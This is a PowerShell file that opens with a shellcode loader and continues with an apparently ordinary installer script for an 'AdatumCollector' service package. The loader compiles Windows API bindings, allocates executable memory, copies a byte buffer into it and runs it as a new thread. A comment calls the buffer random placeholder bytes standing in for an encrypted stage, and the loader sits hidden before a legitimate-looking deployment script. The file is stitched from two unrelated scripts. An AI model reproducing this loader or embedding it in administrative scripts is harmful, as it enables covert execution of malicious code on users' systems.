
[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x54, 0x3a, 0xe2, 0xf2, 0xc7, 0xfc, 0xa7, 0x26, 0x27, 0xc3, 0x9f, 0xcc, 0x9c, 0xbd, 0xee, 0x95,
    0xce, 0xb0, 0x3f, 0x6e, 0x12, 0xa1, 0xe3, 0x6f, 0x3b, 0x95, 0x74, 0x23, 0x5f, 0x61, 0x7b, 0x19,
    0x45, 0x1c, 0xdb, 0x2e, 0xe5, 0xde, 0x07, 0x10, 0xf0, 0x39, 0xef, 0x05, 0xeb, 0xcd, 0x6d, 0xd4,
    0x9b, 0xc7, 0x6a, 0x2b, 0xe4, 0x0e, 0xff, 0xce, 0x3f, 0xd6, 0xe0, 0x18, 0x30, 0x26, 0x19, 0x32,
    0x17, 0x44, 0x7f, 0x23, 0x5e, 0xf9, 0xbd, 0xe4, 0xc5, 0x9d, 0xb2, 0xa0, 0xab, 0x4f, 0x12, 0x63,
    0xa8, 0x3b, 0x06, 0xc7, 0xea, 0xc7, 0x38, 0x86, 0xb9, 0xe0, 0x05, 0x2c, 0x7f, 0x77, 0x78, 0x71,
    0x6b, 0xc5, 0x64, 0x26, 0x8d, 0xd9, 0xdd, 0x4f, 0xe5, 0x32, 0x8c, 0x04, 0x74, 0x51, 0x50, 0x7c,
    0xf8, 0x1a, 0x59, 0x54, 0xd2, 0xc0, 0xc3, 0x7c, 0xcc, 0xee, 0xe5, 0xbd, 0xc0, 0x7c, 0x40, 0xa5,
    0xdb, 0xbe, 0xa2, 0xea, 0x66, 0xa3, 0x04, 0xde, 0xc7, 0x88, 0xfc, 0x9e, 0xee, 0xac, 0x58, 0xe2,
    0x6e, 0xb1, 0x00, 0x12, 0x4d, 0x35, 0xff, 0x08, 0x3a, 0x88, 0xc3, 0xbf, 0x5e, 0xd5, 0xb5, 0xcf,
    0x26, 0xbe, 0x74, 0x70, 0xdb, 0xaf, 0x0c, 0xf7, 0x11, 0x4a, 0xea, 0xec, 0x8f, 0xdb, 0xb5, 0xfb,
    0x66, 0xeb, 0x3d, 0x6c, 0x9e, 0x22, 0xd7, 0x3c, 0xba, 0xdc, 0xd3, 0x95, 0x06, 0x77, 0x57, 0x76,
    0xd5, 0x3d, 0xd8, 0x23, 0x1c, 0xe8, 0x63, 0xb6, 0xab, 0xc0, 0x54, 0xb8, 0x18, 0x39, 0xe4, 0xdb,
    0xcc, 0x09, 0x1c, 0x56, 0x7d, 0x19, 0x6a, 0xc7, 0x89, 0xd7, 0x55, 0x4a, 0x7a, 0x52, 0x28, 0x93,
    0x41, 0x0c, 0xc9, 0xd5, 0xa3, 0x14, 0x86, 0x99, 0x88, 0x87, 0x24, 0x71, 0xbd, 0x7c, 0x76, 0xbb,
    0xd4, 0xfa, 0x2d, 0xf6, 0x52, 0xa5, 0x03, 0xfe, 0x29, 0x72, 0x7d, 0x4e, 0x77, 0x7f, 0x45, 0xc6,
    0x24, 0x2c, 0xd6, 0x64, 0xf8, 0x1d, 0x5a, 0xfe, 0x46, 0xbe, 0x7e, 0xea, 0xe1, 0x00, 0x44, 0x5f,
    0xcc, 0xd3, 0xd3, 0x59, 0x67, 0x8b, 0xa5, 0x16, 0xbe, 0x9d, 0xd6, 0x23, 0xd4, 0x80, 0xbc, 0xaa,
    0x9e, 0xe4, 0xa7, 0x4e, 0xd7, 0xb4, 0x7c, 0x4f, 0x60, 0x06, 0xc1, 0xbf, 0x4f, 0x2d, 0xf4, 0xc9,
    0x9b, 0x61, 0x33, 0x34, 0x4d, 0xc8, 0xd6, 0x48, 0x5e, 0xbd, 0x84, 0xb5, 0x2d, 0x99, 0xad, 0x4d,
    0x4e, 0xa0, 0x05, 0x41, 0x72, 0x49, 0x6c, 0xd4, 0x36, 0x97, 0x6d, 0x24, 0xb7, 0x4f, 0x02, 0x93,
    0x15, 0x72, 0xdc, 0x7d, 0x1b, 0x6a, 0x15, 0x57, 0x84, 0xa6, 0xb3, 0xf9, 0xb7, 0xe7, 0xa5, 0xe6,
    0x38, 0xeb, 0xcd, 0x02, 0x79, 0x6c, 0xb4, 0x37, 0x42, 0x92, 0xd4, 0x70, 0xf8, 0x76, 0xd5, 0x7c,
    0x19, 0x09, 0xb5, 0x6d, 0x5f, 0xa8, 0xbe, 0x2b, 0xeb, 0x2d, 0x02, 0x52, 0x92, 0x1f, 0xaf, 0x43,
    0xc4, 0xfe, 0x08, 0x0c, 0x98, 0xfe, 0xbd, 0xe4, 0x02, 0xcf, 0x6b, 0x18, 0x48, 0x42, 0x61, 0x2a,
    0x55, 0x7d, 0x06, 0x91, 0x36, 0x00, 0x0f, 0x8d, 0x8f, 0x3a, 0xb4, 0x2e, 0x8b, 0x6a, 0x9c, 0xc0,
    0xbe, 0x4d, 0x3a, 0xed, 0x58, 0xd2, 0x1f, 0xe5, 0xb1, 0x74, 0x62, 0xe5, 0xde, 0x51, 0x84, 0x4a,
    0xb6, 0x0c, 0x50, 0x4d, 0xda, 0xad, 0x86, 0x55, 0xf9, 0x1f, 0xd8, 0x66, 0x6b, 0x4e, 0x11, 0x5a,
    0x1e, 0x8c, 0xf0, 0x39, 0x75, 0x15, 0xfa, 0xbc, 0xee, 0xc8, 0x1a, 0xd0, 0xe5, 0xa1, 0x46, 0x5a,
    0x5d, 0xdf, 0xb5, 0xd3, 0x5e, 0x0f, 0xee, 0xa0, 0x84, 0x50, 0x75, 0x75, 0xdb, 0x29, 0xb8, 0x1e,
    0xd6, 0x21, 0x38, 0x9f, 0x65, 0x22, 0x23, 0x1f, 0x5f, 0xc4, 0x28, 0x8d, 0xb2
)

$Handle = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeApi]::WaitForSingleObject($Thread, 2074)
[void][NativeApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
<#
.SYNOPSIS
    Installs the AdatumCollector package and validates the resulting service.
.DESCRIPTION
    Runs the vendor MSI unattended, ensures the service is registered, opens the
    local firewall port and waits for the health endpoint to answer.
    Every step writes to the installation log so a failed rollout can be traced
    on the target host.
.PARAMETER InstallerPath
    Used when the script runs unattended.
.NOTES
    Author: Ops Team
    Last updated: 2025-04-25
#>

param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InstallerPath = 'C:\Scripts\packages\AdatumCollector-3.6.0.msi',

    [string]$ServiceName = 'AdatumCollector',

    [Parameter(Mandatory = $false)]
    [ValidateRange(1024, 65535)]
    [int]$Port = 9443,

    [int]$TimeoutSec = 90,

    [string]$LogPath = "C:\Logs\install-adatumcollector-2025-02-25.log",
    [string]$RuleName = 'AdatumCollector Inbound'
)

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}

if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)
$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}

$regPath = 'HKLM:\SOFTWARE\Adatum\AdatumCollector'
if (-not (Test-Path -Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name 'InstallVersion' -Value '3.6.0' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regPath -Name 'InstallPath' -Value $InstallerPath -PropertyType String -Force | Out-Null

$rule = Get-NetFirewallRule -DisplayName "AdatumCollector Inbound" -ErrorAction SilentlyContinue
if (-not $rule) {
    New-NetFirewallRule -DisplayName "AdatumCollector Inbound" -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow | Out-Null
    Write-Verbose 'Firewall rule created.'
}

$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green

$installed = Get-Service -Name $ServiceName
$details = [pscustomobject]@{
    Product   = 'AdatumCollector'
    Version   = '3.6.0'
    Service   = $installed.Name
    Status    = $installed.Status
    Port      = $Port
    Installer = $InstallerPath
    LogPath   = $LogPath
    InstalledAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$details | ConvertTo-Json -Depth 3 | Set-Content -Path ($LogPath.Replace('.log', '.json')) -Encoding UTF8

$style = @'
<style>
body { font-family: Segoe UI; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@
@($details) | ConvertTo-Html -Title 'Installation summary' -Head $style |
    Set-Content -Path ($LogPath.Replace('.log', '.html')) -Encoding UTF8

$MailTo = 'deploy@internal.corp'
$subject = "AdatumCollector 3.6.0 deployed on $env:COMPUTERNAME"

Send-MailMessage `
    -To $MailTo `
    -From "deploy@internal.corp" `
    -Subject $subject `
    -Body 'Installation completed and the service is responding.' `
    -SmtpServer 'smtp.internal.corp' `
    -Port 25

$stale = Get-ChildItem -Path $env:TEMP -Filter 'adatumcollector-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }
foreach ($dir in $stale) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Host ("Deployment finished for {0}" -f $ServiceName) -ForegroundColor Green

$agentConfig = Join-Path $env:ProgramData 'AdatumCollector\agent.json'
if (Test-Path -LiteralPath (Split-Path -Parent $agentConfig)) {
    Write-Verbose ("Config folder present: {0}" -f (Split-Path -Parent $agentConfig))
}

$logTail = Get-Content -LiteralPath $LogPath -Tail 5 -ErrorAction SilentlyContinue
if ($logTail) {
    Write-Verbose ("Last log lines: {0}" -f ($logTail -join ' | '))
}

$disk = Get-PSDrive -Name C
Write-Verbose ("Free space on C: {0} GB" -f [math]::Round($disk.Free / 1GB, 1))

$rebootPending = Test-Path -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending'
if ($rebootPending) {
    Write-Warning 'A reboot is pending before the next deployment.'
}

$uninstallKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
$entry = Get-ChildItem -Path $uninstallKey -ErrorAction SilentlyContinue |
    ForEach-Object { Get-ItemProperty $_.PSPath } |
    Where-Object { $_.DisplayName -like 'AdatumCollector*' } | Select-Object -First 1
if ($entry) {
    Write-Verbose ("Registered version: {0}" -f $entry.DisplayVersion)
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}
